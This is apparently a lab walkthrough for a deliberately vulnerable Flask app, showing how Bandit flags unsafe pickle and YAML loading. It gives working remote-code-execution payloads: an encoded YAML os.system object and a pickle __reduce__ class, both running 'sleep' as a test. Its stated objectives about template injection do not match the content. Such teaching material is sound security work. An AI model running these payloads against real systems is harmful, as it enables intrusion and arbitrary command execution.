# Insecure deserialization

Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process -- taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.


### Objective 

* Use template injection to read the flask "configurations" such as the secret for signing JWT tokens
* Use template injection to envoke a local function to leverage RCE

#### spoiler 1 - discovery

There are a lot of ways to do your reconnaissance when performing a penetration test.
However, in this context we have the source code available!

So why not take advanteage of that?

First lets try to run a bandit scan against the application source code!

Bandit is a tool designed to find common security issues in Python code. To do this Bandit processes each file, builds an AST from it, and runs appropriate plugins against the AST nodes. Once Bandit has finished scanning all the files it generates a report.

Installing Bandit is as easy as:

```
pip install bandit
# Or if you're working with a Python 3 project
pip3 install bandit
```

And to run we simply do:

```
bandit -r path/to/your/code
```

Now after running bandit from the results we can find 2 things that should spark out interest such as:

```
>> Issue: [B301:blacklist] Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.
   Severity: Medium   Confidence: High
   Location: target/project/controllers/About.py:15
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b301-pickle
14	        with open('../filename.pickle', 'rb') as handle:
15	            a = pickle.load(handle)
16	        return render_template("about/index.html", content = a)
```

and

```
>> Issue: [B506:yaml_load] Use of unsafe yaml load. Allows instantiation of arbitrary objects. Consider yaml.safe_load().
   Severity: Medium   Confidence: High
   Location: target/project/controllers/Information.py:16
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b506_yaml_load.html
15	            yaml_file = base64.b64decode(input)
16	            content = yaml.load(yaml_file)
17	    except:
```

Now we can look into these files and start tracing them in the web application

#### Spoiler 2 - Discovery && exploitation YAML

When we first authenticate to the application and we start browsing it we find the following page:

```
http://0.0.0.0:8081/information/eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWNhdGlvbiwgdXBkYXRlcyBjb21taW5nIHNvb24h
```

As we can see this link has some base64 encoded string in it, so we decode it to see what it is.

```
Input: eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWNhdGlvbiwgdXBkYXRlcyBjb21taW5nIHNvb24h
Output: yaml: The information page is still under construcation, updates comming soon!
```

This ouput reflects what is being shown in the applications page.
This is a great indicator that there is a function that parses yaml and prints 
the contents on the screen.

Now, if we do some research on the internet we find that pythons yaml allows instantiation of arbitrary objects.
After some more research we can than finally construct the following payload.

```
payload: yaml: !!python/object/apply:os.system ["sleep 10"]
encoded payload: eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbInNsZWVwIDEwIl0=

```

with this payload we perform an system command which initiates a sleep command.
Now, if the server takes some time to get back to us we know our injection
was succesfull.

This attack could than ultimately be used to create reverse shell connections or
something similar!


#### Spoiler 3 - discovery && exploitation PICKLE

The Pickle exploit might be somewhat harder to discover.
It is more likely to discover these types of vulnerabilities when you can perform
a static/manual code review. 

the pickle vulnerability is located at:

```
http://0.0.0.0:8081/about
```

To be able to exploit this vulnerability we need to send our own serialized
object to the application to ultimately perform a code execution attack

To be able to craft a succesfull exploit we first have to determine how the object is deserialized.

```
@app.route("/about/sync", methods=['POST'])
def deserialization_pickle():
        with open("../pickle.hacker", "wb+") as file:
            att = request.form['data_obj']
            attack = bytes.fromhex(att)
            file.write(attack)
            file.close()
        with open('../pickle.hacker', 'rb') as handle:
            a = pickle.load(handle)
            print(attack)
            return render_template("about/index.html", content = a)
```

As we can see it is just a simple "pickle.load()"

Now we want to serialize our own class with our arbitrary code execution and convert that to 
hex since the class that deserializes the attack reads the bytes from hex.

The code that is ultimately responsible for generating the exploit code wil look something like:

```
import pickle
import os
import base64
import binascii 

class RunBinSh(object):
  def __reduce__(self):
    return (os.system,('sleep 5',))

print(binascii.hexlify(pickle.dumps(RunBinSh())))
```

if we run the output against the application we can determine by the effective response time
of the application if the code execution was successfull.
